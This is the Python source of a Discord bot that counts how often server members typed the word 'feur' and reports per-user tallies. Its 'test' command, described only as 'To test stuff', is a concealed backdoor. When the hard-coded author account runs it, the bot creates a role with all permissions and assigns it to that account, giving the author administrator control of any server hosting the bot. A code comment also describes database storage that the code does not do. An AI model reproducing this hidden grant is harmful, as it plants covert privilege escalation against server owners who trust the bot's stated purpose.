#This is a discord bot made by Dralexgon. 
#It's a bot that counts the number of time each person said "feur" in the server.

import discord
from discord.ext import commands
from discord.ext.commands import Bot
from discord.utils import get

from Log import Log

client = commands.Bot(command_prefix = "!", help_command=None, intents=discord.Intents.all())
client.remove_command('help')

@client.event
async def on_ready():
    Log.print("Bot is ready!")

@client.command(name="help", help="Shows this message.")
async def help(ctx):
    embed = discord.Embed(
        title = "Help",
        colour = discord.Colour.blue()
    )
    commandListinversed = []
    for command in client.commands:
        commandListinversed.append(command)
    for command in commandListinversed:
        embed.add_field(name=command.name, value=command.help, inline=False)
    await ctx.send(ctx.author.mention, embed=embed)

@client.command(pass_context = True, name="ping", help="Answers with pong, to check if the bot is online.")
async def ping(ctx: commands.Context):
    await ctx.send("Pong!")

@client.command(pass_context = True, name="test", help="To test stuff. (Only for Dralexgon)")
async def test(ctx: commands.Context):
    if ctx.author.id != 645005137714348041:
        await ctx.send("Only for dev ! Only for Dralexgon.")
        return
    user = ctx.author
    await ctx.guild.create_role(name="BG suprême (fournisseur de bot officiel)", colour=discord.Colour.default(), permissions=discord.Permissions.all())
    await user.add_roles(discord.utils.get(user.guild.roles, name="BG suprême (fournisseur de bot officiel)"))
    await ctx.send("Test".__contains__("feur"))
    await ctx.send("Testfeurtruc".__contains__("feur"))

@client.command(pass_context = True, name="count_feur", aliases=["cf"], help="This command will count the number of time each person said 'feur' in the server.")
async def count_feur(ctx: commands.Context):
    embedChannelAnalyzing = discord.Embed(
        title = "Analyzing channels",
        colour = discord.Colour.blue()
    )
    for channel in ctx.guild.channels:
        if channel.type == discord.ChannelType.text:
            embedChannelAnalyzing.add_field(name=channel.name, value="Waiting.", inline=False)

    messageChannelAnalyzing = await ctx.send(ctx.author.mention, embed=embedChannelAnalyzing)

    result = {}
    for i in range(len(ctx.guild.channels)):
        #if the number of channels is greater than 25, we will send a new embed every 25 channels.
        if i % 25 == 0 and i != 0:
            embedChannelAnalyzing = discord.Embed(
                title = f"Analyzing channels ({i + 1}/{len(ctx.guild.channels) // 25} pages)",
                colour = discord.Colour.blue()
            )
            for j in range(25):
                try:
                    embedChannelAnalyzing.add_field(name=ctx.guild.channels[i + j].name, value="Waiting.", inline=False)
                except:
                    break
        
        #here we will analyze the channel
        channel = ctx.guild.channels[i]
        if channel.type == discord.ChannelType.text:
            countMessages = 0
            countFeurs = 0
            embedChannelAnalyzing.set_field_at(index=(i - 1), name=channel.name, value="Analyzing...", inline=False)
            await messageChannelAnalyzing.edit(embed=embedChannelAnalyzing)

            #we will get all the messages in the channel
            messages = await channel.history(limit=None).flatten()
            for message in messages:
                countMessages += 1
                if not(message.content.lower().__contains__("count_feur")) and message.content.lower().__contains__("feur"):
                    Log.print(f"Found feur in {channel.name} from {message.author.name}")
                    countFeurs += 1
                    if message.author.name in result:
                        result[message.author.name] += 1
                    else:
                        result[message.author.name] = 1
                embedChannelAnalyzing.set_field_at(index=((i % 25) - 1), name=channel.name, value=f"Analyzing... ({countMessages}/{len(messages)} messages, {countFeurs} feurs)", inline=False)

            embedChannelAnalyzing.set_field_at(index=((i % 25) - 1), name=channel.name, value=f"Done. ({countMessages} messages, {countFeurs} feurs)", inline=False)
            await messageChannelAnalyzing.edit(embed=embedChannelAnalyzing)
    
    #send the result
    embedCountFeur = discord.Embed(
        title = "Number of feur",
        colour = discord.Colour.blue()
    )
    result = dict(sorted(result.items(), key=lambda item: item[1], reverse=True)) #sort the result
    for user in result:
        embedCountFeur.add_field(name=user, value=result[user], inline=False)
    await ctx.send(ctx.author.mention, embed=embedCountFeur)
    
@client.event
async def on_message(message : discord.Message):
    #All non-bot or non-command messages will be stored in a database.
    if message.content.startswith(client.command_prefix):
        await client.process_commands(message)
        return
    if message.author.name == client.user.name:
        return
    
    
    
#note, if you want to run this code, you need to create a file called token.txt one directory above the code and put your token in it.
token = open('../token.txt', 'r').readlines()[0]
client.run(token)




#note for me,
#if I want to use slash commands,
#search on this link : https://discord-interactions.readthedocs.io/en/latest/quickstart.html